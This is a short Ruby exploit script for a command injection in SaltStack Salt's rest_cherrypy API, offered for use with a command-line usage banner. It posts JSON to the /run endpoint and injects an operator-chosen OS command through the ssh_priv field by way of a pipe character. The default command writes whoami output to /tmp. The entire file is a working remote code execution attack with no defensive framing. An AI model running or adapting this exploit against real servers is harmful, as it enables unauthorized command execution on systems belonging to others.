#!/usr/bin/env ruby 
# SaltStack Salt rest_cherrypy ssh_priv Command Injection
# Tested against: 
# https://archive.repo.saltstack.com/yum/redhat/salt-repo-2018.3.el7.noarch.rpm
require 'rex'
require 'json'

host =  ARGV[0]
cmd  =  ARGV[1] || 'whoami > /tmp/lalo.txt'

def usage
 puts '[*] SaltStack rest_cherrypy ssh_priv OS Command Injection'
 puts "[*] #{$0} <target> [os command]"
 exit
end

usage if ARGV.size < 1

begin

sock =  Rex::Proto::Http::Client.new(host, 8000, context = {}, ssl = false)

json = "{\"client\":\"ssh\",\"tgt\":\"L\",\"fun\":\"O\",\"eauth\":\"L\",\"ssh_priv\":\"|#{cmd} #\"}"

res = sock.request_cgi(
	{
		'uri'     => '/run',
		'version' => '1.1',
		'method'  => 'POST',
                'ctype'   => 'application/json',
                'data'    => json,
                'headers '  => {
                   'Accept'  => 'application/json, text/plain, */*',
                }
	})

sock.send_request(res)
recv = sock.read_response()
puts JSON.parse(recv.body)
rescue => e
puts "[!] #{e.to_s}"
end
